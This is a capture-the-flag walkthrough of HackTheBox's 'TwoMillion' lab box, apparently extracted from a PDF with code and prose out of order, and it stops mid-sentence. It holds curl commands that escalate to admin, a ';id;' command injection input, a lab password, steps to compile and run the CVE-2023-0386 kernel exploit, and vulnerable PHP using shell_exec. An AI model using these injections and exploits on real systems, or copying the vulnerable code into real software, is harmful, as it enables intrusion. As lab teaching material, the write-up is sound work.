Synopsis
TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on
HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable
invite code. After hacking the invite code an account can be created on the platform. The account can be
used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator.
With administrative access the user can perform a command injection in the admin VPN generation
endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to
password re-use the attackers can login as user admin on the box. The system kernel is found to be
outdated and CVE-2023-0386 can be used to gain a root shell.

Enumeration
Nmap
The scan reveals ports 22 (SSH) and 80 (Nginx) open, with port 80 redirecting to 2million.htb , so let's add
this vHost to our /etc/hosts file.
Upon accessing the vHost identified above we see the old version of the HackTheBox website.
nmap -sC -sV -Pn 10.10.10.11
echo '10.10.10.11 2million.htb' | sudo tee -a /etc/hosts
The website has functionality to login and join the platform. Upon clicking on join followed by Join HTB we
are redirected to /invite .
This seems to be the old HTB invite code page. There are numerous guides online on how to hack this but
let's investigate a bit closer. Taking a look at the page's source code we see the following.
<script defer src="/js/inviteapi.min.js"></script>
<script defer>
$(document).ready(function() {
$('#verifyForm').submit(function(e) {
e.preventDefault();
var code = $('#code').val();
var formData = { "code": code };
$.ajax({
type: "POST",
dataType: "json",
data: formData,
url: '/api/v1/invite/verify',
success: function(response) {
if (response[0] === 200 && response.success === 1 &&
response.data.message === "Invite code is valid!") {
// Store the invite code in localStorage
localStorage.setItem('inviteCode', code);
window.location.href = '/register';
 } else {
alert("Invalid invite code. Please try again.");
 }
 },
error: function(response) {
The second function seems to be called when the submit button is pressed and sends a POST request to
/api/v1/invite/verify in order to check if the code provided is valid or not. There is also a script called
inviteapi.min.js being loaded. Let's see what it does.
The JavaScript code seems to be obfuscated, however de4js and ChatGPT can make short work of deobfuscating this code. After inputting the code in de4js and clicking on auto decode we get the following
readable JavaScript code.
alert("An error occurred. Please try again.");
 }
 });
 });
 });
</script>
eval(function(p,a,c,k,e,d){e=function(c){return
c.toString(36)};if(!''.replace(/^/,String)){while(c--)
{d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function()
{return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new
RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8=
{"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j()
{$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0)
{3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax
|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|g
enerate|verify'.split('|'),0,{}))
function verifyInviteCode(code) {
var formData = {
"code": code
 };
$.ajax({
type: "POST",
dataType: "json",
data: formData,
url: '/api/v1/invite/verify',
success: function (response) {
console.log(response)
 },
error: function (response) {
console.log(response)
 }
 })
}
function makeInviteCode() {
$.ajax({
type: "POST",
dataType: "json",
There are two functions in the code above. The first one is similar to the one that we saw earlier in the invite
page, that can be used to verify an invite code. The second one is a little more interesting, as it can make a
POST request to /api/v1/invite/how/to/generate . This endpoint seems very interesting, so in order to
access it we can either call this JavaScript function from our browser's console, or use cURL. We will go with
the latter.
Note: We use the -s switch so that cURL won't show the connection progress. We also use jq to
beautify the outputted JSON
The output is in JSON format and contains some interesting data that seems encrypted. The encryption type
is hinted as being ROT13 which is basically a Caesars cipher. A hint is also visible that mentions we need to
identify the encryption type and decrypt it. The website rot13 can be used to decrypt the above data.
After pasting the encrypted data to the website we get the following message.
The message mentions that we can generate an invite code by making a POST request to
/api/v1/invite/generate . Let's do this as shown previously.
url: '/api/v1/invite/how/to/generate',
success: function (response) {
console.log(response)
 },
error: function (response) {
console.log(response)
 }
 })
}
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
In order to generate the invite code, make a POST request to /api/v1/invite/generate
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
The output is similar to what we found above, but this time it seems to be encoded instead of encrypted
with what seems to be Base64. Let's decode the above Base64 in our terminal.
The above appears like a valid invite code. Let's input it into the /invite page and click submit.
Indeed the above works and we are redirected to /register . The invite code is automatically transferred
to this page and filled in.
Let's register with the username test , email test@2million.htb and a random password of our choice.
After clicking register we are redirected to /login at which point we can use our newly created account to
login to the website.
echo U1oyN0ktUTVaOVMtREtOSVgtUDNDU00= | base64 -d
SZ27I-Q5Z9S-DKNIX-P3CSM
After logging in we are redirected to /home .
The website features only a few pages that work, with the more interesting of those being the Access page.
The Access page allows a user to Download and Regenerate their VPN file to be able to access the HTB
infrastructure. Let's fire up BurpSuite and see what the Connection Pack download button does.
Upon clicking on the button a GET request is sent out to /api/v1/users/vpn/generate and in return the
VPN file for our current user is downloaded.
Let's try requesting the URL /api to see if anything interesting is returned.
Note: The -v flag is used in cURL to see more details about the server response, such as the response
code.

curl -v 2million.htb/api
It seems we get a status code of 401 Unauthorized . Let's try providing the website with our PHP session
cookie which we can grab either from our browser or from BurpSuite as seen previously.
curl -sv 2million.htb/api --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
Now let's request /api/v1 to see if any endpoints are listed.
curl 2million.htb/api/v1 --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
We get a list of quite a few endpoints that are available in the API, with some of the most interesting ones
being the admin specific endpoints. As a test we can hit the /admin/auth endpoint to check if we are an
admin user.
curl http://2million.htb/api/v1/admin/auth --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
As expected we are not currently an administrative user. Let's check out the /admin/vpn/generate
endpoint by switching our request to POST and including our cookie once more.
We get a 401 Unauthorised error, most probably because we are not an admin. Let's move to the final
administrative endpoint, /admin/settings/update . We note that this request needs to be a PUT as shown
in the output from /api/v1 .
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6"
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
Interestingly enough, this time we do not get an Unauthorized error, but instead the API replies with
Invalid content type . It is often for APIs to use JSON for sending and receiving data, and we already
know that the API replies in JSON, so lets set the Content-Type header to JSON and try again.
We now get a new error message, specifically that there is a parameter missing called email . Let's supply
the email for our own user in JSON format.
We get another error for a missing parameter called is_admin . Let's add this as well.
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" | jq
{
"status": "danger",
"message": "Missing parameter: email"
}
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"email":"test@2million.htb"}' | jq
{
"status": "danger",
"message": "Missing parameter: is_admin"
}
Since we set the parameter to true , an error message informs us that this variable needs a value of 0 or 1.
Let's set it to 1.
The above command seems to have been successful as our user information is returned and the is_admin
variable is set to 1. We can further verify this by accessing the /admin/auth endpoint that we saw earlier.
This time instead of an error we get the value true back indicating that we are indeed an admin now.
Foothold
Let's check out the /admin/vpn/generate URL now that we have sufficient permissions.
The result informs us of a missing parameter called username . At this point we can infer that this is the
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"email":"test@2million.htb", "is_admin": true}' | jq
{
"status": "danger",
"message": "Variable is_admin needs to be either 0 or 1."
}
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"email":"test@2million.htb", "is_admin": '1'}' | jq
{
"id": 13,
"username": "test",
"is_admin": 1
}
curl http://2million.htb/api/v1/admin/auth --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
{
"message": true
}
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" | jq
{
"status": "danger",
"message": "Missing parameter: username"
}
username of the user that the VPN will be generated for, so let's attempt to input a random username.
After sending the above command we see that a VPN configuration file was generated for user test and
was printed out to us. If this VPN is being generated via the exec or system PHP function and there is
insufficient filtering in place - which is possible as this is an administrative only function - it might be
possible to inject malicious code in the username field and gain command execution on the remote system.
Let's test this assumption by injecting the command ;id; after the username.
The command is successful and we gain command execution. Let's start a Netcat listener to catch a shell.
We can then get a shell with the following payload.
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"username":"test"}'

We encode the payload in Base64 and add it to the following command.
Lateral Movement
Enumeration of the web directory reveals a file called .env which contains database credentials for a user
called admin .
The /etc/passwd file reveals that there is indeed a user on the system called admin .
Owed to password re-use we can login as admin over SSH with SuperDuperPass123
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie

ssh admin@2million.htb
The user flag can be found in /home/admin .
Privilege Escalation
Enumeration of the current user's mails in /var/mail reveals a file called admin , which contains all the
emails for our current user. Let's read it.
The email originates from ch4p and is letting the admin know that he should perform updates on this
system as there have been some serious kernel exploits recently. More specifically an exploit for OverlayFS
/ FUSE is mentioned.
Let's perform a quick Google search with the keywords overlays fuse exploit . The results reveal this
article about an exploit which is assigned CVE-2023-0386, that exists in the Linux kernel. Some more
research reveals this post from Ubuntu that details the vulnerable kernel versions.
Enumeration of the current kernel version reveals that the box is using 5.15.70 .
admin@ubuntu:~$ uname -a
Linux ubuntu 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022
x86_64 x86_64 x86_64 GNU/Linux
We can also see that the box is currently on the Jammy release.
The affected kernel versions for jammy go up to 5.15.0-70.77 and as seen previously the box is using
5.15.70 so it is a good idea to test if it is vulnerable. There are multiple exploits available online, one of
which is this one on GitHub.
Download the exploit locally by cloning the repository.
Compress the entire repository so that it is easier to upload.
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description: Ubuntu 22.04.2 LTS
Release: 22.04
Codename: jammy
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r cve.zip CVE-2023-0386
Then upload it using scp .
On the box, navigate to /tmp and unzip the contents of cve.zip .
As per the instructions on the GitHub page, enter the CVE-2023-0386 directory and compile the code
scp cve.zip admin@2million.htb:/tmp
cd /tmp
unzip cve.zip
cd /tmp/CVE-2023-0386/
make all
Note: The compilation throws a few warnings but these can be safely ignored.
Finally, let's run the exploit in two steps. We run the first command in the background.
Then we execute the exp binary in the foreground.
./fuse ./ovlcap/lower ./gc &
[+] len of gc: 0x3ee0
[1] 6153
./exp
The exploit is successful as shown from the id command and the root flag can be found in /root/ .
Post Root
There seems to be a file called thank_you.json in the root directory along with the flag. Let's read it.
cat thank_you.json
The data seems to be URL encoded. We can decode it online or with BurpSuite. A good website to do these
kind of tasks is CyberChef. After decoding we get the following data.
{"encoding": "url", "data":

This time the output seems to be both Base64 encoded and XORed with the key HackTheBox . We can
further decrypt this with CyberChef by selecting the From Base64 and XOR operations, setting the XOR key
to HackTheBox and setting the encoding to UTF8 . The final message is as follows.

Update Settings
The first vulnerability that allows users to set themselves as admin lies in the update_settings function in
AdminController.php .
Dear HackTheBox Community,
We are thrilled to announce a momentous milestone in our journey together. With immense
joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users!
This incredible feat would not have been possible without each and every one of you.
From the very beginning, HackTheBox has been built upon the belief that knowledge
sharing, collaboration, and hands-on experience are fundamental to personal and
professional growth. Together, we have fostered an environment where innovation thrives
and skills are honed. Each challenge completed, each machine conquered, and every skill
learned has contributed to the collective intelligence that fuels this vibrant
community.
To each and every member of the HackTheBox community, thank you for being a part of
this incredible journey. Your contributions have shaped the very fabric of our platform
and inspired us to continually innovate and evolve. We are immensely proud of what we
have accomplished together, and we eagerly anticipate the countless milestones yet to
come.
Here's to the next chapter, where we will continue to push the boundaries of
cybersecurity, inspire the next generation of ethical hackers, and create a world where
knowledge is accessible to all.
With deepest gratitude,
The HackTheBox Team
public function update_settings($router) {
$db = Database::getDatabase();
$is_admin = $this->is_admin($router);

if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !==

return json_encode([
'status' => 'danger',
'message' => 'Variable is_admin needs to be either 0 or 1.'
 ]);
exit;
 }
$stmt = $db->query('SELECT * FROM users WHERE email = ?', ['s' => [$email]]);
$user = $stmt->fetch_assoc();
if ($user) {
$stmt = $db->query('UPDATE users SET is_admin = ? WHERE email = ?', ['s' =>
[$is_admin, $email]]);
 } else {
return json_encode([
'status' => 'danger',
'message' => 'Email not found.'
 ]);
exit;
 }
More specifically, the following part.
In the above code the is_admin function is called (which is also used to check if a user is admin through
the /api/v1/admin/auth URL) to check if the current user is an administrator or not. If the resulting
variable is false, a 401 Unauthorised is returned. Let's take a look at the is_admin function.
This function checks the current user session for the username and is_admin variables and also checks if
the value of is_admin is equal to 1 at which point it returns JSON with message set to true. If this check
does not pass, it returns message => false .
if ($user['username'] == $_SESSION['username'] ) {
$_SESSION['is_admin'] = $is_admin;
 }
return json_encode(['id' => $user['id'], 'username' => $user['username'],
'is_admin' => $is_admin]);
 }
$is_admin = $this->is_admin($router);
if (!$is_admin) {
return header("HTTP/1.1 401 Unauthorized");
exit;
 }
public function is_admin($router)
 {
if (!isset($_SESSION) || !isset($_SESSION['loggedin']) || $_SESSION['loggedin']
!== true || !isset($_SESSION['username'])) {
return header("HTTP/1.1 401 Unauthorized");
exit;
 }
$db = Database::getDatabase();
$stmt = $db->query('SELECT is_admin FROM users WHERE username = ?', ['s' =>
[$_SESSION['username']]]);
$user = $stmt->fetch_assoc();
if ($user['is_admin'] == 1) {
header('Content-Type: application/json');
return json_encode(['message' => TRUE]);
 } else {
header('Content-Type: application/json');
return json_encode(['message' => FALSE]);
 }
 }
The problem lies in the fact that is_admin in the update_settings function is not checked for a specific
value, but both if it exists and/or its value is true and since the is_admin function returns JSON, the if
statement in the update_settings results to true because is_admin has a value.
Admin VPN
The second vulnerability exists in the VPNController.php and specifically the admin_vpn function.
public function admin_vpn($router) {
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
return header("HTTP/1.1 401 Unauthorized");
exit;
 }
if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== 1) {
return header("HTTP/1.1 401 Unauthorized");
exit;
 }
if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !==
'application/json') {
return json_encode([
'status' => 'danger',
'message' => 'Invalid content type.'
 ]);
exit;
 }
$body = file_get_contents('php://input');
$json = json_decode($body);
if (!isset($json)) {
return json_encode([
'status' => 'danger',
'message' => 'Missing parameter: username'
 ]);
exit;
 }
if (!$json->username) {
return json_encode([
'status' => 'danger',
'message' => 'Missing parameter: username'
 ]);
exit;
 }
$username = $json->username;
$this->regenerate_user_vpn($router, $username);
$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");
return is_array($output) ? implode("<br>", $output) : $output;
While this function calls the regenerate_user_vpn function, which has sanitisation in place to prevent any
injection attacks, to generate a VPN, it instead uses a shell_exec to read and print the contents of the
